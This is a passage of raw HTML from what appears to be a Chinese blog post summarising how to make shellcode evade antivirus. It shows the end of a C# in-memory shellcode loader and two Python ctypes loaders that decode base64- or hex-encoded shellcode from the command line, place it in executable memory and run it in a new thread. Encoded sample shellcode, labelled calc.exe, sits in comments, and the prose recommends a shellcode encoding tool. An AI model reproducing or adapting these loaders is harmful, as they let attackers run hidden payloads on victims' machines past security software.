179);">0</span>, <span style="color: rgb(0, 134, 179);">0</span>, funcAddr, pinfo, <span style="color: rgb(0, 134, 179);">0</span>, <span style="color: rgb(167, 29, 93);">ref</span> threadId);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">WaitForSingleObject</span>(hThread, <span style="color: rgb(0, 134, 179);">0xFFFFFFFF</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">return</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(0, 134, 179);">UInt32</span> MEM_COMMIT = <span style="color: rgb(0, 134, 179);">0x1000</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(0, 134, 179);">UInt32</span> PAGE_EXECUTE_READWRITE = <span style="color: rgb(0, 134, 179);">0x40</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">// The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">UInt32</span> <span style="color: rgb(0, 134, 179);">VirtualAlloc</span>(</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> lpStartAddr,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> size,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> flAllocationType,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> flProtect</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        );</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">IntPtr</span> <span style="color: rgb(0, 134, 179);">CreateThread</span>(</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> lpThreadAttributes,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> dwStackSize,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> lpStartAddress,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">IntPtr</span> param,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> dwCreationFlags,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">ref</span> <span style="color: rgb(0, 134, 179);">UInt32</span> lpThreadId</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        );</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">UInt32</span> <span style="color: rgb(0, 134, 179);">WaitForSingleObject</span>(</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">IntPtr</span> hHandle,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> dwMilliseconds</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        );</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">}</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code></pre></section><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="204" data-backw="319" data-ratio="0.6395715185885318" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结二/1_zfOzuIORSXbLHfaDwluvIUJsxazhzQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkA0QDgibzMmgibt91kx305na20rzfOzuIORSXbLHfaDwluvIUJsxazhzQ/640?wx_fmt=png'" data-type="png" data-w="1587" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="166" data-backw="319" data-ratio="0.51953125" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结二/2_Ok1chX4ic4BIvhMt1c5mr3ibNzsRRA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAksoxAELX6Cygr4gyphiaRunzLSpWOk1chX4ic4BIvhMt1c5mr3ibNzsRRA/640?wx_fmt=png'" data-type="png" data-w="1024" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">其他语言也是一样，比如py 异或编码、base64、十六进制这些都是可以的</p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">py Base64(k8gege):</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">import</span> ctypes</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">import</span> sys</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">import</span> base64</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#calc.exe</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">shellcode=bytearray(base64.b64decode(sys.argv[<span style="color: rgb(0, 134, 179);">1</span>]).decode(<span style="color: rgb(24, 54, 145);">"hex"</span>))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">ptr = ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">VirtualAlloc</span>(ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                          ctypes.c_int(len(shellcode)),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                          ctypes.c_int(<span style="color: rgb(0, 134, 179);">0x3000</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                          ctypes.c_int(<span style="color: rgb(0, 134, 179);">0x40</span>))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">RtlMoveMemory</span>(ctypes.c_int(ptr),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                     buf,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                     ctypes.c_int(len(shellcode)))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">ht = ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">CreateThread</span>(ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.c_int(ptr),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.pointer(ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>)))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-<span style="color: rgb(0, 134, 179);">1</span>))</span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">py 十六进制(k8gege)：</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#scrun by k8gege</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">import</span> ctypes</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">import</span> sys</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#calc.exe</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">shellcode=bytearray(sys.argv[<span style="color: rgb(0, 134, 179);">1</span>].decode(<span style="color: rgb(24, 54, 145);">"hex"</span>))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">ptr = ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">VirtualAlloc</span>(ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                          ctypes.c_int(len(shellcode)),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                          ctypes.c_int(<span style="color: rgb(0, 134, 179);">0x3000</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                          ctypes.c_int(<span style="color: rgb(0, 134, 179);">0x40</span>))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">RtlMoveMemory</span>(ctypes.c_int(ptr),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                     buf,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                     ctypes.c_int(len(shellcode)))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">ht = ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">CreateThread</span>(ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.c_int(ptr),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>),</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                                         ctypes.pointer(ctypes.c_int(<span style="color: rgb(0, 134, 179);">0</span>)))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-<span style="color: rgb(0, 134, 179);">1</span>))</span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">还有一款编码的工具也好用，安利一下：</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">https://github.com/ecx86/shellcode_encoder</p><p style="margin: 1.5em 